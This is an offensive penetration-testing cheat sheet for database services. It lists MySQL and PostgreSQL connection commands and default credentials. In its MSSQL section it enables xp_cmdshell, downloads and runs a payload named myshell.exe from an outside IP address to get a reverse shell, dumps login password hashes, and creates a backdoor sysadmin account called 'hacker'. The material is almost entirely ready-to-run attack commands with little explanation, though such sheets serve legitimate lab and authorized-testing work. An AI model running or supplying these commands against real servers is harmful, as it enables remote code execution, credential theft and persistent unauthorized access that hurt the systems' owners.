#### MYSQL
```
#login
mysql -u <user> -p'<pass>' -h <ip_address> -P 3306          

#Default credentials
root : '' 
```

#### POSTGRESQL
```
#Connect
psql -h <ip> -U <user> -p <port>

#Default credentials
postgres : postgres
```
#### MSSQL
```
impacket-mssqlclient <user>:<pass>@<ip_address> -windows-auth

#Enable xp_cmdshell
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'xp_cmdshell', 1
RECONFIGURE

#Get Reverse Shell.
xp_cmdshell powershell.exe iwr -uri http://10.10.93.147:1234/myshell.exe -Outfile C:\temp\myshell.exe
xp_cmdshell C:\temp\myshell.exe


#Common Enumeration (https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```